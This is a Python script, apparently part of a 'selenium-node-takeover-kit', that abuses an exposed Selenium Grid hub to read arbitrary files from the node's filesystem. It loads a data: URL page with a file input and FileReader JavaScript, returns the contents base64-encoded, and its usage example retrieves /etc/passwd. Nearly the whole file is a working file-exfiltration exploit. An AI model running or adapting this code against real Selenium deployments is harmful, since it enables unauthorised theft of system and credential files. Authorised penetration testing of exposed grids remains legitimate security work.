#!/usr/bin/env python3
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_download.py
# 
# Downloads files off of the selenium nodes filesystem. This uses some inline js and UselessFileDetector to embed a file from the filestystem back into the inline page. As this encodes in base64, it should be able to handle binary files.
#
# pip3 install selenium
# ./selenium_node_download.py -h http://selenium-hub.lan:4444/wd/hub -r /etc/passwd -l ./remote_hub_passwd

import base64, getopt, sys
from selenium import webdriver
from selenium.webdriver.remote.file_detector import UselessFileDetector

def get_file_contents(driver, remote_file):
    " A simple file input plus some FileReader js to store file contents in 'inf' "
    decoded_contents = None
    try:
        driver.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
        driver.find_element_by_id('f').send_keys(remote_file) # Load local file into input field (and therefor "inf")
        js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
        if js_return:
            try:
                decoded_contents = base64.b64decode(js_return.split(',')[1])
            except:
                print('Cannot Decode: %s' % js_return)
        else:
            print('Cannot Read: %s' % remote_file)
    except:
        print('Doesnt Exist: %s' % remote_file)
    return decoded_contents

if __name__ == '__main__':
    hub_url, remote_file, local_file = None, None, None
    myopts, args = getopt.getopt(sys.argv[1:],':h:r:l:')
    for o, a in myopts:
        if o == '-h':
            hub_url = a
        elif o == '-r':
            remote_file = a
        elif o == '-l':
            local_file = a

    # Probably any browser would work here
    driver = webdriver.Remote( command_executor=hub_url, desired_capabilities={'browserName': 'firefox'} )
    driver.file_detector = UselessFileDetector()

    try:
        file_contents = get_file_contents(driver, remote_file)
        if local_file:
            f = open(local_file, 'w+b')
            f.write(file_contents)
            f.close()
        else:
            print(file_contents.decode('ascii'))
    finally:
        driver.quit()
    sys.exit(0)
